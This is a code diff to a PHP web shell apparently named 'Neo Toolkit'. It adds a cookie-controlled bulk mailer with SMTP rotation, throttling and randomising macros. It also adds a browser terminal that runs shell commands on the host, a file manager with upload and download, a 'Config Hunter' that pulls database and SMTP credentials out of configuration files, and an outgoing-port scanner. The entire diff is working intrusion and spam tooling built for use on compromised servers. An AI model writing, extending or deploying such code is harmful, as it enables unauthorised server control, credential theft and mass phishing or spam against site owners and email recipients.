@@ -145,6 +145,118 @@ if (isset($_COOKIE['cmd']) || isset($_COOKIE['smtp'])) {
         setcookie('cmd', '', time() - 3600, '/');
     }
 
+    // --- Mailer Commands (via 'smtp' cookie) ---
+    if (isset($_COOKIE['smtp'])) {
+        $parts = explode('|', $_COOKIE['smtp'], 10);
+        // Format: smtp_details|from_email|from_name|to_list|subject|content_type|rotate|pause_every|pause_for|body_ref
+        list($smtp_details, $from_email_base, $from_name_base, $to_list, $subject_base, $content_type, $rotate_after, $pause_every, $pause_for, $body_ref) = array_pad($parts, 10, null);
+
+        $recipients = array_filter(array_map('trim', explode(',', $to_list)));
+        if (empty($recipients)) {
+            $response['output'] = 'ERROR: No recipient emails provided in cookie.';
+        } else {
+            $body_base = '';
+            if (!empty($body_ref)) {
+                if (preg_match('~^https?://~i', $body_ref) || is_file($body_ref)) {
+                    $body_base = @file_get_contents($body_ref);
+                }
+            }
+            if (empty($body_base) && isset($_COOKIE['body'])) {
+                $body_base = $_COOKIE['body'];
+            }
+            if (empty($body_base)) {
+                $response['output'] = 'ERROR: Email body is missing. Provide a valid URL, file path, or a `body` cookie.';
+            } else {
+                $is_html = (strtolower($content_type) === 'html');
+                $sent_count = 0;
+                $failed_count = 0;
+                $log = [];
+
+                // --- SMTP vs Localhost Logic ---
+                $smtp_parts = explode(':', $smtp_details);
+                $host = $smtp_parts[0] ?? 'localhost';
+
+                if (strtolower($host) === 'localhost') { // LOCAL MAILER
+                    if (!function_exists('mail')) {
+                        $response['output'] = "ERROR: The mail() function is disabled.";
+                    } else {
+                        foreach ($recipients as $to) {
+                            $from_email = NeoClear($from_email_base, $to, $from_email_base);
+                            $from_domain = explode('@', $from_email)[1] ?? 'localhost.localdomain';
+                            $from_name = NeoClear($from_name_base, $to, $from_email);
+                            $subject = NeoClear($subject_base, $to, $from_email);
+                            $body = NeoClear($body_base, $to, $from_email);
+                            $message_id = "<" . md5(uniqid()) . "@" . $from_domain . ">";
+                            $headers = "From: $from_name <$from_email>\r\n" . "Reply-To: $from_name <$from_email>\r\n" . "MIME-Version: 1.0\r\n" . "Message-ID: $message_id\r\n";
+                            if ($is_html) {
+                                $boundary = "----=" . md5(uniqid(time()));
+                                $headers .= "Content-Type: multipart/alternative; boundary=\"$boundary\"\r\n";
+                                $plain_text_body = strip_tags($body);
+                                $message_body = "--$boundary\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n$plain_text_body\r\n\r\n";
+                                $message_body .= "--$boundary\r\nContent-Type: text/html; charset=utf-8\r\n\r\n$body\r\n\r\n";
+                                $message_body .= "--$boundary--";
+                            } else {
+                                $headers .= "Content-Type: text/plain; charset=utf-8\r\n";
+                                $message_body = $body;
+                            }
+                            if (mail($to, $subject, $message_body, $headers)) {
+                                $sent_count++;
+                                $log[] = "-> Sent to $to";
+                            } else {
+                                $failed_count++;
+                                $log[] = "-> FAILED for $to";
+                            }
+                        }
+                    }
+                } else { // SMTP MAILER
+                    $smtps = [];
+                    $current_smtp_index = 0;
+                    $smtps[] = ['host' => $smtp_parts[0] ?? '', 'port' => $smtp_parts[1] ?? '', 'user' => $smtp_parts[2] ?? '', 'pass' => $smtp_parts[3] ?? '', 'enc' => strtolower($smtp_parts[4] ?? '')];
+
+                    foreach ($recipients as $to) {
+                        if ((int) $rotate_after > 0 && $sent_count > 0 && $sent_count % (int) $rotate_after === 0) {
+                            $current_smtp_index = ($current_smtp_index + 1) % count($smtps);
+                            $log[] = "--- Rotating SMTP (Feature currently supports single SMTP from cookie) ---";
+                        }
+                        $current_smtp = $smtps[$current_smtp_index];
+                        $from_email = NeoClear($from_email_base, $to, $from_email_base);
+                        $from_name = NeoClear($from_name_base, $to, $from_email);
+                        $subject = NeoClear($subject_base, $to, $from_email);
+                        $body = NeoClear($body_base, $to, $from_email);
+                        $mailer = new NeoMailer(true);
+                        try {
+                            $mailer->isHTML = $is_html;
+                            $mailer->Host = $current_smtp['host'];
+                            $mailer->Port = (int) $current_smtp['port'];
+                            $mailer->SMTPSecure = $current_smtp['enc'];
+                            $mailer->Username = $current_smtp['user'];
+                            $mailer->Password = $current_smtp['pass'];
+                            $mailer->SMTPAuth = true;
+                            $mailer->setFrom($from_email, $from_name);
+                            $mailer->addAddress($to);
+                            $mailer->Subject = $subject;
+                            $mailer->Body = $body;
+                            $mailer->send();
+                            $sent_count++;
+                            $log[] = "-> Sent to $to via " . $current_smtp['host'];
+                        } catch (Exception $e) {
+                            $failed_count++;
+                            $log[] = "-> FAILED for $to via " . $current_smtp['host'] . " (" . $e->getMessage() . ")";
+                        }
+                        unset($mailer);
+                        if ((int) $pause_every > 0 && (int) $pause_for > 0 && $sent_count > 0 && $sent_count % (int) $pause_every === 0 && ($sent_count + $failed_count) < count($recipients)) {
+                            sleep((int) $pause_for);
+                            $log[] = "--- Paused for $pause_for second(s) ---";
+                        }
+                    }
+                }
+                $response = ['success' => $sent_count > 0, 'output' => "Task complete. Sent: $sent_count, Failed: $failed_count\n\n" . implode("\n", $log)];
+            }
+        }
+        setcookie('smtp', '', time() - 3600, '/');
+        setcookie('body', '', time() - 3600, '/');
+    }
+
     echo json_encode($response);
     exit;
 }
@@ -170,7 +282,7 @@ if (isset($_POST['action'])) {
             if (@chdir($new_dir)) {
                 echo "SUCCESS:cd:" . getcwd();
             } else {
-                echo "ERROR:cd:Cannot access '{$matches[1]}': No such file or directory";
+                echo "ERROR:cd:Cannot access '$matches[1]': No such file or directory";
             }
             exit;
         }
@@ -222,17 +334,23 @@ if (isset($_POST['action'])) {
                             $creds['DB_USER'] = $m[1];
                         if (preg_match("/DB_PASSWORD',\s*'([^']+)'/", $content, $m))
                             $creds['DB_PASSWORD'] = $m[1];
-                        if (preg_match('/public \$host = '([^']+)';/', $content, $m))
+                        if (preg_match('/public \$host = \'([^\']+)\';/', $content, $m))
                             $creds['DB_HOST'] = $m[1];
-                        if (preg_match('/public \$user = '([^']+)';/', $content, $m))
+                        if (preg_match('/public \$user = \'([^\']+)\';/', $content, $m))
                             $creds['DB_USER'] = $m[1];
-                        if (preg_match('/public \$password = '([^']+)';/', $content, $m))
+                        if (preg_match('/public \$password = \'([^\']+)\';/', $content, $m))
                             $creds['DB_PASSWORD'] = $m[1];
                         if (preg_match('/MAIL_HOST=(.*)/', $content, $m))
                             $creds['MAIL_HOST'] = trim($m[1]);
                         if (preg_match('/MAIL_PORT=(.*)/', $content, $m))
                             $creds['MAIL_PORT'] = trim($m[1]);
-                        if (preg_match('/MAIL_USERNAME=(.*)/', $content, $m))
+                        if (
+                            preg_match(
+                                '/MAIL_USERNAME=(.*)/',
+                                $content,
+                                $m
+                            )
+                        )
                             $creds['MAIL_USERNAME'] = trim($m[1]);
                         if (preg_match('/MAIL_PASSWORD=(.*)/', $content, $m))
                             $creds['MAIL_PASSWORD'] = trim($m[1]);
@@ -268,7 +386,7 @@ if (isset($_POST['action'])) {
     }
     // --- File Manager Actions ---
     elseif ($action === 'file_manager') {
-        header('Content-Type:application/json');
+        header('Content-Type: application/json');
         $do = $_POST['do'] ?? 'list';
         $path = $_POST['path'] ?? $current_dir;
         $base_dir = realpath(getcwd());
@@ -324,13 +442,13 @@ if (isset($_POST['action'])) {
                     else
                         $files[] = $item_data;
                 }
-                $server_info = ['cwd' => $path, 'php_version' => PHP_VERSION, 'uname' => php_uname(), 'server_ip'] = $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['SERVER_NAME']), 'zip_enabled' => class_exists('ZipArchive')];
+                $server_info = ['cwd' => $path, 'php_version' => PHP_VERSION, 'uname' => php_uname(), 'server_ip' => $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['SERVER_NAME']), 'zip_enabled' => class_exists('ZipArchive')];
                 echo json_encode(['info' => $server_info, 'items' => array_merge($dirs, $files)]);
                 break;
             case 'get_content':
                 $file = $_POST['target'] ?? null;
                 if ($file && is_file($file) && is_readable($file)) {
-                    echo json_encode(['success' => true, 'content'] = file_get_contents($file));
+                    echo json_encode(['success' => true, 'content' => file_get_contents($file)]);
                 } else {
                     echo json_encode(['success' => false, 'error' => 'Cannot read file.']);
                 }
@@ -344,7 +462,7 @@ if (isset($_POST['action'])) {
                     header('Expires: 0');
                     header('Cache-Control: must-revalidate');
                     header('Pragma: public');
-                    header('Content-Length': filesize($file));
+                    header('Content-Length: ' . filesize($file));
                     readfile($file);
                     exit;
                 }
@@ -354,7 +472,7 @@ if (isset($_POST['action'])) {
             case 'upload':
                 function reArrayFiles(&$file_post)
                 {
-                    $file_ary = [];
+                    $file_ary = array();
                     $file_count = count($file_post['name']);
                     $file_keys = array_keys($file_post);
                     for ($i = 0; $i < $file_count; $i++) {
@@ -395,8 +513,202 @@ if (isset($_POST['action'])) {
     }
     exit;
 }
-?>
 
+// --- Embedded NeoMailer Class (v2.5.1) ---
+class NeoMailer
+{
+    public $Host = 'localhost';
+    public $Port = 25;
+    public $SMTPAuth = false;
+    public $Username = '';
+    public $Password = '';
+    public $SMTPSecure = '';
+    public $Timeout = 10;
+    public $ErrorInfo = '';
+    public $isHTML = false;
+    protected $smtp = null;
+    public $FromName;
+    public $From;
+    public $To = [];
+    public $Subject;
+    public $Body;
+    public function __construct($exceptions = false)
+    {
+    }
+    public function setFrom($address, $name = '')
+    {
+        $this->From = $address;
+        $this->FromName = $name;
+    }
+    public function addAddress($address, $name = '')
+    {
+        $this->To[] = $address;
+    }
+    public function send()
+    {
+        $this->smtp = new NeoSMTP();
+        $host = $this->Host;
+        $use_crypto = ($this->SMTPSecure === 'ssl' || $this->SMTPSecure === 'tls');
+        if ($use_crypto) {
+            $host = $this->SMTPSecure . '://' . $this->Host;
+        }
+        if (!$this->smtp->connect($host, $this->Port, $this->Timeout)) {
+            throw new Exception("SMTP Connect failed: " . $this->smtp->getError()['error']);
+        }
+        if (!$use_crypto) {
+            if (!$this->smtp->hello(gethostname())) {
+                throw new Exception("EHLO failed: " . $this->smtp->getError()['error']);
+            }
+            if ($this->SMTPSecure === 'starttls') {
+                if (!$this->smtp->startTLS()) {
+                    throw new Exception("STARTTLS failed: " . $this->smtp->getError()['error']);
+                }
+            }
+        }
+        if (!$this->smtp->hello(gethostname())) {
+            throw new Exception("EHLO (after crypto) failed: " . $this->smtp->getError()['error']);
+        }
+        if ($this->SMTPAuth) {
+            if (!$this->smtp->authenticate($this->Username, $this->Password)) {
+                throw new Exception("SMTP Auth failed: " . $this->smtp->getError()['error']);
+            }
+        }
+        if (!$this->smtp->mail($this->From)) {
+            throw new Exception("MAIL FROM failed: " . $this->smtp->getError()['error']);
+        }
+        foreach ($this->To as $to_email) {
+            if (!$this->smtp->recipient($to_email)) {
+                throw new Exception("RCPT TO failed for $to_email: " . $this->smtp->getError()['error']);
+            }
+        }
+        if (!$this->smtp->data($this->buildMessage())) {
+            throw new Exception("DATA failed: " . $this->smtp->getError()['error']);
+        }
+        $this->smtp->quit();
+        return true;
+    }
+    protected function buildMessage()
+    {
+        $from_domain = explode('@', $this->From)[1] ?? 'localhost.localdomain';
+        $msg = "Date: " . date('r') . "\r\n";
+        $msg .= "To: " . implode(',', $this->To) . "\r\n";
+        $msg .= "From: " . $this->FromName . " <" . $this->From . ">\r\n";
+        $msg .= "Subject: " . $this->Subject . "\r\n";
+        $msg .= "Message-ID: <" . md5(uniqid(time())) . "@" . $from_domain . ">\r\n";
+        $msg .= "MIME-Version: 1.0\r\n";
+        if ($this->isHTML) {
+            $boundary = "----=" . md5(uniqid(time()));
+            $msg .= "Content-Type: multipart/alternative; boundary=\"$boundary\"\r\n\r\n";
+            $plain_text_body = strip_tags($this->Body);
+            $msg .= "--$boundary\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n$plain_text_body\r\n\r\n";
+            $msg .= "--$boundary\r\nContent-Type: text/html; charset=utf-8\r\n\r\n$this->Body\r\n\r\n";
+            $msg .= "--$boundary--";
+        } else {
+            $msg .= "Content-Type: text/plain; charset=utf-8\r\n\r\n";
+            $msg .= $this->Body;
+        }
+        return $msg;
+    }
+}
+class NeoSMTP
+{
+    protected $connection = false;
+    protected $error = ['error' => ''];
+    public function connect($host, $port, $timeout)
+    {
+        if ($this->connection) {
+            fclose($this->connection);
+        }
+        $this->connection = @fsockopen($host, $port, $errno, $errstr, $timeout);
+        if (!$this->connection) {
+            $this->error = ['error' => "$errstr ($errno)"];
+            return false;
+        }
+        stream_set_timeout($this->connection, $timeout);
+        $this->getServerResponse();
+        return true;
+    }
+    public function hello($host)
+    {
+        return $this->sendCommand("EHLO $host", 250);
+    }
+    public function startTLS()
+    {
+        if (!$this->sendCommand('STARTTLS', 220))
+            return false;
+        if (!stream_socket_enable_crypto($this->connection, true, STREAM_CRYPTO_METHOD_TLS_CLIENT))
+            return false;
+        return true;
+    }
+    public function authenticate($user, $pass)
+    {
+        if (!$this->sendCommand('AUTH LOGIN', 334))
+            return false;
+        if (!$this->sendCommand(base64_encode($user), 334))
+            return false;
+        if (!$this->sendCommand(base64_encode($pass), 235))
+            return false;
+        return true;
+    }
+    public function mail($from)
+    {
+        return $this->sendCommand("MAIL FROM:<$from>", 250);
+    }
+    public function recipient($to)
+    {
+        return $this->sendCommand("RCPT TO:<$to>", [250, 251]);
+    }
+    public function data($msg)
+    {
+        if (!$this->sendCommand('DATA', 354))
+            return false;
+        fputs($this->connection, $msg . "\r\n.\r\n");
+        return $this->getServerResponse(250);
+    }
+    public function quit()
+    {
+        if (is_resource($this->connection)) {
+            $this->sendCommand('QUIT', 221);
+            fclose($this->connection);
+            $this->connection = false;
+        }
+    }
+    public function getError()
+    {
+        return $this->error;
+    }
+    protected function sendCommand($cmd, $expect)
+    {
+        if (!is_resource($this->connection)) {
+            $this->error = ['error' => 'No connection'];
+            return false;
+        }
+        fputs($this->connection, $cmd . "\r\n");
+        return $this->getServerResponse($expect);
+    }
+    protected function getServerResponse($expect = null)
+    {
+        $response = '';
+        while (is_resource($this->connection) && !feof($this->connection)) {
+            $line = fgets($this->connection, 515);
+            if ($line === false)
+                break;
+            $response .= $line;
+            if (substr($line, 3, 1) == ' ' || empty($line))
+                break;
+        }
+        $code = (int) substr($response, 0, 3);
+        $this->error = ['error' => $response];
+        if ($expect !== null) {
+            if (is_array($expect)) {
+                return in_array($code, $expect);
+            }
+            return $code == $expect;
+        }
+        return true;
+    }
+}
+?>
 <!DOCTYPE html>
 <html lang="en">
 
@@ -404,7 +716,342 @@ if (isset($_POST['action'])) {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Neo Toolkit</title>
-    <!-- Styles and scripts unchanged -->
+    <style>
+        :root {
+            --background: #1a1d24;
+            --foreground: #e0e0e0;
+            --prompt: #50fa7b;
+            --cursor: rgba(0, 255, 0, 0.8);
+            --border: #44475a;
+            --tab-bg: #282a36;
+            --tab-active-bg: #44475a;
+            --input-bg: #222;
+            --button-bg: #6272a4;
+            --success: #50fa7b;
+            --error: #ff5555;
+            --warn: #f1fa8c;
+        }
+
+        html,
+        body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            background-color: var(--background);
+            color: var(--foreground);
+            font-family: 'Menlo', 'Consolas', 'monospace';
+            font-size: 14px;
+        }
+
+        .tabs {
+            display: flex;
+            background-color: var(--tab-bg);
+        }
+
+        .tab-link {
+            padding: 10px 15px;
+            cursor: pointer;
+            border-bottom: 3px solid transparent;
+        }
+
+        .tab-link.active {
+            background-color: var(--tab-active-bg);
+            border-bottom-color: var(--prompt);
+        }
+
+        .tab-content {
+            display: none;
+            height: calc(100% - 41px);
+            overflow-y: auto;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        #terminal,
+        #tools {
+            width: 100%;
+            height: 100%;
+            box-sizing: border-box;
+            padding: 15px;
+        }
+
+        .line {
+            display: flex;
+        }
+
+        .prompt {
+            color: var(--prompt);
+            font-weight: bold;
+            margin-right: 8px;
+            white-space: nowrap;
+        }
+
+        .input-area {
+            flex-grow: 1;
+            display: flex;
+        }
+
+        #input {
+            background: none;
+            border: none;
+            color: var(--foreground);
+            font-family: inherit;
+            font-size: inherit;
+            flex-grow: 1;
+            padding: 0;
+        }
+
+        #input:focus {
+            outline: none;
+        }
+
+        .cursor {
+            background-color: var(--cursor);
+            display: inline-block;
+            width: 8px;
+            animation: blink 1s step-end infinite;
+        }
+
+        @keyframes blink {
+
+            from,
+            to {
+                background-color: transparent;
+            }
+
+            50% {
+                background-color: var(--cursor);
+            }
+        }
+
+        .output {
+            margin-bottom: 10px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        .tool-section {
+            margin-bottom: 25px;
+            border: 1px solid var(--border);
+            border-radius: 5px;
+            padding: 15px;
+        }
+
+        .tool-section h2 {
+            margin-top: 0;
+            color: var(--prompt);
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 10px;
+        }
+
+        .tool-section button {
+            background-color: var(--button-bg);
+            color: var(--foreground);
+            border: none;
+            padding: 10px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-family: inherit;
+        }
+
+        .form-grid {
+            display: grid;
+            grid-template-columns: 120px 1fr;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .form-grid label,
+        .form-grid .label {
+            font-weight: bold;
+            align-self: start;
+            padding-top: 8px;
+        }
+
+        .form-grid input,
+        .form-grid textarea,
+        .form-grid select {
+            width: 100%;
+            background-color: var(--input-bg);
+            border: 1px solid var(--border);
+            color: var(--foreground);
+            padding: 8px;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-family: inherit;
+            resize: vertical;
+        }
+
+        #scan-results,
+        #mail-status,
+        #scan-smtp-results {
+            margin-top: 15px;
+            white-space: pre-wrap;
+        }
+
+        .status-success,
+        .status-open {
+            color: var(--success);
+        }
+
+        .status-error,
+        .status-blocked {
+            color: var(--error);
+        }
+
+        .status-warn {
+            color: var(--warn);
+        }
+
+        .flex-group {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .flex-group input[type="number"] {
+            width: 60px;
+        }
+
+        #files-tab {
+            padding: 10px;
+            box-sizing: border-box;
+        }
+
+        .fm-header {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 10px;
+            background-color: var(--tab-bg);
+            padding: 8px;
+            border-radius: 4px;
+            margin-bottom: 10px;
+        }
+
+        .fm-header .path-input {
+            flex-grow: 1;
+            background-color: var(--input-bg);
+            border: 1px solid var(--border);
+            color: var(--foreground);
+            padding: 5px;
+            border-radius: 3px;
+        }
+
+        .fm-server-info {
+            font-size: 0.8em;
+            color: var(--warn);
+            white-space: pre;
+        }
+
+        .fm-toolbar button {
+            margin-right: 5px;
+        }
+
+        .fm-toolbar button:disabled {
+            background-color: #333;
+            cursor: not-allowed;
+        }
+
+        .fm-table-container {
+            margin-top: 10px;
+            overflow-x: auto;
+        }
+
+        .fm-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .fm-table th,
+        .fm-table td {
+            border: 1px solid var(--border);
+            padding: 8px;
+            text-align: left;
+        }
+
+        .fm-table th {
+            background-color: var(--tab-active-bg);
+        }
+
+        .fm-table tr:nth-child(even) {
+            background-color: var(--tab-bg);
+        }
+
+        .fm-table .item-name {
+            cursor: pointer;
+            color: var(--foreground);
+        }
+
+        .fm-table .item-name:hover {
+            text-decoration: underline;
+            color: var(--prompt);
+        }
+
+        .fm-actions a {
+            margin: 0 4px;
+            cursor: pointer;
+            text-decoration: none;
+            color: var(--warn);
+        }
+
+        .fm-actions a:hover {
+            color: var(--prompt);
+        }
+
+        #fm-editor-modal {
+            display: none;
+            position: fixed;
+            z-index: 100;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            justify-content: center;
+            align-items: center;
+        }
+
+        .fm-editor-content {
+            background-color: var(--background);
+            border: 1px solid var(--border);
+            width: 80%;
+            max-width: 900px;
+            height: 80%;
+            display: flex;
+            flex-direction: column;
+            border-radius: 5px;
+        }
+
+        .fm-editor-header {
+            padding: 10px;
+            background-color: var(--tab-active-bg);
+            font-weight: bold;
+        }
+
+        #fm-editor-textarea {
+            flex-grow: 1;
+            background-color: var(--input-bg);
+            color: var(--foreground);
+            border: none;
+            padding: 10px;
+            font-family: inherit;
+            resize: none;
+        }
+
+        .fm-editor-footer {
+            padding: 10px;
+            text-align: right;
+        }
+
+        #fm-status-bar {
+            padding: 5px;
+            text-align: center;
+            display: none;
+        }
+    </style>
 </head>
 
 <body>
@@ -415,40 +1062,501 @@ if (isset($_POST['action'])) {
     </div>
 
     <div id="terminal-tab" class="tab-content active">
-        <!-- Terminal UI unchanged -->
+        <div id="terminal" onclick="document.getElementById('input').focus();">
+            <div id="history"></div>
+            <div class="line">
+                <span class="prompt" id="prompt"></span>
+                <div class="input-area">
+                    <input type="text" id="input" autocomplete="off" autocorrect="off" autocapitalize="off"
+                        spellcheck="false" autofocus>
+                    <span class="cursor">&nbsp;</span>
+                </div>
+            </div>
+        </div>
     </div>
 
     <div id="files-tab" class="tab-content">
-        <!-- File Manager UI unchanged -->
+        <div class="fm-header">
+            <input type="text" id="fm-path-input" class="path-input">
+            <div id="fm-server-info" class="fm-server-info"></div>
+        </div>
+        <div class="fm-toolbar">
+            <button id="fm-back" disabled>&lt;</button>
+            <button id="fm-forward" disabled>&gt;</button>
+            <button id="fm-new-file">New File</button>
+            <button id="fm-new-folder">New Folder</button>
+            <button id="fm-upload-file">Upload File(s)</button>
+        </div>
+        <input type="file" id="fm-file-input" style="display: none;" multiple>
+        <div id="fm-status-bar"></div>
+        <div class="fm-table-container">
+            <table class="fm-table">
+                <thead>
+                    <tr>
+                        <th>Name</th>
+                        <th>Size</th>
+                        <th>Perms</th>
+                        <th>Modified</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody id="fm-table-body"></tbody>
+            </table>
+        </div>
+        <div id="fm-editor-modal">
+            <div class="fm-editor-content">
+                <div class="fm-editor-header" id="fm-editor-filename"></div>
+                <textarea id="fm-editor-textarea"></textarea>
+                <div class="fm-editor-footer">
+                    <button id="fm-editor-save">Save</button>
+                    <button onclick="document.getElementById('fm-editor-modal').style.display='none'">Close</button>
+                </div>
+            </div>
+        </div>
     </div>
 
     <div id="tools-tab" class="tab-content">
         <div id="tools">
             <div class="tool-section">
                 <h2>Server Scanner</h2>
-                <!-- Server Scanner UI unchanged -->
+                <p>Check for common disabled functions and open outgoing SMTP ports.</p><button
+                    id="scan-server-btn">Start Scan</button>
+                <div id="scan-smtp-results"></div>
             </div>
             <div class="tool-section">
                 <h2>Config Hunter</h2>
-                <!-- Config Hunter UI unchanged -->
-            </div>
-            <!-- Mailer section remains in UI but backend disabled -->
-            <div class="tool-section">
-                <h2>Mailer</h2>
-                <form id="mail-form">
-                    <!-- Mail form fields unchanged -->
-                </form>
-                <div id="mail-status"></div>
+                <p>Scan for configuration files to find database/SMTP credentials.</p><button id="scan-btn">Start
+                    Scan</button>
+                <div id="scan-results"></div>
             </div>
             <div class="tool-section">
                 <h2>Macro Help</h2>
-                <!-- Macro help unchanged -->
+                <p><strong>[-email-]</strong>: The recipient's full email address.</p>
+                <p><strong>[-emailuser-]</strong>: The username part of the recipient's email.</p>
+                <p><strong>[-emaildomain-]</strong>: The domain part of the recipient's email.</p>
+                <p><strong>[-sender-]</strong>: The sender's email address.</p>
+                <p><strong>[-time-]</strong>: The current date and time.</p>
+                <p><strong>[-randomletters-]</strong>: A random string of lowercase letters.</p>
+                <p><strong>[-randomstring-]</strong>: A random string of letters and numbers.</p>
+                <p><strong>[-randomnumber-]</strong>: A random string of numbers.</p>
+                <p><strong>[-randommd5-]</strong>: A random MD5 hash.</p>
             </div>
         </div>
     </div>
-
     <script>
-        // JavaScript unchanged
+        const selfUrl = '<?php echo basename($_SERVER['PHP_SELF']); ?>';
+        let cwd = '<?php echo addslashes(realpath(getcwd())); ?>';
+        let fm_zip_enabled = false;
+
+        function openTab(evt, tabName, isFmTab = false) {
+            document.querySelectorAll('.tab-content').forEach(tc => tc.style.display = "none");
+            document.querySelectorAll('.tab-link').forEach(tl => tl.classList.remove("active"));
+            document.getElementById(tabName).style.display = "block";
+            evt.currentTarget.classList.add("active");
+            if (isFmTab && fmHistory.length === 0) {
+                renderFileManager(cwd, true);
+            }
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.innerText = text;
+            return div.innerHTML;
+        }
+
+        function showStatus(bar, message, isError = false) {
+            bar.textContent = message;
+            bar.className = isError ? 'status-error' : 'status-success';
+            bar.style.display = 'block';
+            setTimeout(() => {
+                bar.style.display = 'none';
+            }, 4000);
+        }
+
+        const terminalEl = document.getElementById('terminal');
+        const historyEl = document.getElementById('history');
+        const inputEl = document.getElementById('input');
+        const promptEl = document.getElementById('prompt');
+        let commandHistory = [];
+        let historyIndex = -1;
+
+        function updatePrompt() {
+            const user = '<?php echo function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : 'user'; ?>';
+            const hostname = '<?php echo gethostname(); ?>';
+            promptEl.textContent = `${user}@${hostname}:${cwd}$`;
+        }
+        async function executeCommand(cmd) {
+            const formData = new FormData();
+            formData.append('action', 'shell');
+            formData.append('cmd', cmd);
+            formData.append('cwd', cwd);
+            try {
+                const response = await fetch(selfUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+                const output = await response.text();
+                if (output.startsWith('SUCCESS:cd:')) {
+                    cwd = output.substring(11);
+                } else if (output.startsWith('ERROR:cd:')) {
+                    appendTerminalOutput(output.substring(9));
+                } else {
+                    appendTerminalOutput(output);
+                }
+            } catch (error) {
+                appendTerminalOutput(`Network Error: ${error.message}`);
+            }
+            updatePrompt();
+            inputEl.value = '';
+            inputEl.disabled = false;
+            inputEl.focus();
+            terminalEl.scrollTop = terminalEl.scrollHeight;
+        }
+
+        function appendTerminalOutput(text) {
+            const outputDiv = document.createElement('div');
+            outputDiv.className = 'output';
+            outputDiv.textContent = text;
+            historyEl.appendChild(outputDiv);
+        }
+
+        function appendCommandToHistory(cmd) {
+            const historyLine = document.createElement('div');
+            historyLine.className = 'line';
+            historyLine.innerHTML = `<span class="prompt">${promptEl.textContent}</span><div class="input-area"><span>${escapeHtml(cmd)}</span></div>`;
+            historyEl.appendChild(historyLine);
+        }
+        inputEl.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                const cmd = inputEl.value.trim();
+                if (cmd) {
+                    appendCommandToHistory(cmd);
+                    inputEl.disabled = true;
+                    commandHistory.push(cmd);
+                    historyIndex = commandHistory.length;
+                    executeCommand(cmd);
+                }
+            } else if (e.key === 'ArrowUp') {
+                e.preventDefault();
+                if (historyIndex > 0) {
+                    historyIndex--;
+                    inputEl.value = commandHistory[historyIndex];
+                }
+            } else if (e.key === 'ArrowDown') {
+                e.preventDefault();
+                if (historyIndex < commandHistory.length - 1) {
+                    historyIndex++;
+                    inputEl.value = commandHistory[historyIndex];
+                } else {
+                    historyIndex = commandHistory.length;
+                    inputEl.value = '';
+                }
+            }
+        });
+
+        const scanBtn = document.getElementById('scan-btn');
+        const scanResultsEl = document.getElementById('scan-results');
+        const scanServerBtn = document.getElementById('scan-server-btn');
+        const scanSmtpResultsEl = document.getElementById('scan-smtp-results');
+
+        scanServerBtn.addEventListener('click', async () => {
+            scanServerBtn.disabled = true;
+            scanServerBtn.textContent = 'Scanning...';
+            scanSmtpResultsEl.innerHTML = 'Checking server capabilities...';
+            const formData = new FormData();
+            formData.append('action', 'scan_smtp');
+            try {
+                const response = await fetch(selfUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+                const results = await response.json();
+                let html = '<strong>PHP Functions:</strong>\n';
+                html += `fsockopen(): <span class="${results.fsockopen ? 'status-success' : 'status-error'}">${results.fsockopen ? 'Enabled' : 'DISABLED'}</span>\n\n`;
+                html += '<strong>Outgoing SMTP Ports:</strong>\n';
+                results.ports.forEach(res => {
+                    html += `Port ${res.port}: <span class="${res.status === 'Open' ? 'status-open' : 'status-blocked'}">${res.status}</span>\n`;
+                });
+                scanSmtpResultsEl.textContent = html;
+            } catch (error) {
+                scanSmtpResultsEl.textContent = `Error during scan: ${error.message}`;
+            }
+            scanServerBtn.disabled = false;
+            scanServerBtn.textContent = 'Start Scan';
+        });
+        scanBtn.addEventListener('click', async () => {
+            scanBtn.disabled = true;
+            scanBtn.textContent = 'Scanning...';
+            scanResultsEl.innerHTML = '';
+            const formData = new FormData();
+            formData.append('action', 'scan_configs');
+            formData.append('cwd', cwd);
+            try {
+                const response = await fetch(selfUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+                const results = await response.json();
+                if (results.length === 0) {
+                    scanResultsEl.textContent = 'No configuration files with known credentials found.';
+                } else {
+                    let html = '';
+                    results.forEach(res => {
+                        html += `<strong>Found: ${res.path}</strong>\n`;
+                        for (const [key, value] of Object.entries(res.creds)) {
+                            html += `  ${key}: ${value}\n`;
+                        }
+                        html += '\n';
+                    });
+                    scanResultsEl.textContent = html;
+                }
+            } catch (error) {
+                scanResultsEl.textContent = `Error during scan: ${error.message}`;
+            }
+            scanBtn.disabled = false;
+            scanBtn.textContent = 'Start Scan';
+        });
+
+
+        // --- File Manager ---
+        const fmPathInput = document.getElementById('fm-path-input');
+        const fmServerInfoEl = document.getElementById('fm-server-info');
+        const fmTableBody = document.getElementById('fm-table-body');
+        const fmStatusBar = document.getElementById('fm-status-bar');
+        const fmBackBtn = document.getElementById('fm-back');
+        const fmForwardBtn = document.getElementById('fm-forward');
+        const fmUploadBtn = document.getElementById('fm-upload-file');
+        const fmFileInput = document.getElementById('fm-file-input');
+        let fmHistory = [];
+        let fmHistoryIndex = -1;
+
+        function updateFmNavButtons() {
+            fmBackBtn.disabled = fmHistoryIndex <= 0;
